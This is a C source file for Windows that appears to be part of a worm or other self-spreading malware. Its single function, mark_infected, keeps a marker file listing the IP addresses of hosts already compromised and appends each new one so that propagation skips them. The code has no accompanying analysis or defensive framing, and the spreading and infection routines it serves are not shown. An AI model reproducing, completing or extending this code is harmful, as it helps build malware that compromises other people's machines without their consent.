#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

int mark_infected(const char *ip)
{
    HANDLE file;
    LARGE_INTEGER offset;
    unsigned char buffer[4096];
    size_t ip_length;
    size_t position = 0;
    int candidate = 1;
    int pending_cr = 0;
    int line_active = 0;
    int already_infected = 0;
    DWORD bytes_read;

    if (ip == NULL)
        return -1;

    ip_length = strlen(ip);
    file = CreateFileA(SELF_MARKER, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    offset.QuadPart = 0;
    if (!SetFilePointerEx(file, offset, NULL, FILE_BEGIN)) {
        CloseHandle(file);
        return -1;
    }

    for (;;) {
        DWORD i;

        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL)) {
            CloseHandle(file);
            return -1;
        }
        if (bytes_read == 0)
            break;

        for (i = 0; i < bytes_read; ++i) {
            unsigned char ch = buffer[i];

            if (ch == '\n') {
                if (candidate && position == ip_length) {
                    already_infected = 1;
                    break;
                }
                position = 0;
                candidate = 1;
                pending_cr = 0;
                line_active = 0;
                continue;
            }

            line_active = 1;
            if (pending_cr) {
                if (position >= ip_length || ip[position] != '\r')
                    candidate = 0;
                if (position < ip_length)
                    ++position;
                pending_cr = 0;
            }

            if (ch == '\r') {
                pending_cr = 1;
            } else {
                if (position >= ip_length || ip[position] != (char)ch)
                    candidate = 0;
                if (position < ip_length)
                    ++position;
            }
        }

        if (already_infected)
            break;
    }

    if (!already_infected) {
        if (pending_cr) {
            if (position >= ip_length || ip[position] != '\r')
                candidate = 0;
            if (position < ip_length)
                ++position;
        }

        if (line_active && candidate && position == ip_length)
            already_infected = 1;
    }

    if (already_infected) {
        CloseHandle(file);
        return 1;
    }

    if (ip_length > (size_t)MAXDWORD - 1) {
        CloseHandle(file);
        return -1;
    }

    {
        size_t total_length = ip_length + 1;
        unsigned char *line = (unsigned char *)malloc(total_length);
        size_t written_total = 0;

        if (line == NULL) {
            CloseHandle(file);
            return -1;
        }

        if (ip_length != 0)
            memcpy(line, ip, ip_length);
        line[ip_length] = '\n';

        offset.QuadPart = 0;
        if (!SetFilePointerEx(file, offset, NULL, FILE_END)) {
            free(line);
            CloseHandle(file);
            return -1;
        }

        while (written_total < total_length) {
            DWORD bytes_written = 0;
            DWORD remaining = (DWORD)(total_length - written_total);

            if (!WriteFile(file, line + written_total, remaining, &bytes_written, NULL) ||
                bytes_written == 0) {
                free(line);
                CloseHandle(file);
                return -1;
            }
            written_total += bytes_written;
        }

        free(line);
    }

    if (!CloseHandle(file))
        return -1;

    return 0;
}